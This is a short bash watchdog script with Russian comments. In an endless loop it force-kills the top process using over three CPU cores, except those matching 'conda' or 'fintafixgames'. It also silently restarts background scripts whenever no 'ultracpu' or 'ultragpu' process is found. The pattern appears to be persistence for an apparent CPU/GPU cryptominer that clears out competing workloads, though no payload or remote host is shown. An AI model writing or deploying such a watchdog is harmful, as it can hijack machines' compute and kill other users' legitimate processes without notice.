#!/bin/bash

while true; do
    # Проверка процессов, использующих более 3 ядер и без указанных ключевых слов
    processes=$(ps aux --sort=-%cpu | awk '{if ($3 > 300 && !/conda|fintafixgames/) print $0}')

    if [ -n "$processes" ]; then
        # Получаем PID процесса и убиваем его
        pid=$(echo "$processes" | awk '{print $2}' | head -n 1)
        kill -9 $pid
    fi

    # Проверка процессов с ключевым словом "ultracpu"
    if ! pgrep -f "ultracpu" >/dev/null; then
        ./sh1.sh >/dev/null 2>&1 &
    fi

    # Проверка процессов с ключевым словом "ultragpu"
    if ! pgrep -f "ultragpu" >/dev/null; then
        ./sh2.sh >/dev/null 2>&1 &
    fi

    sleep 10
done
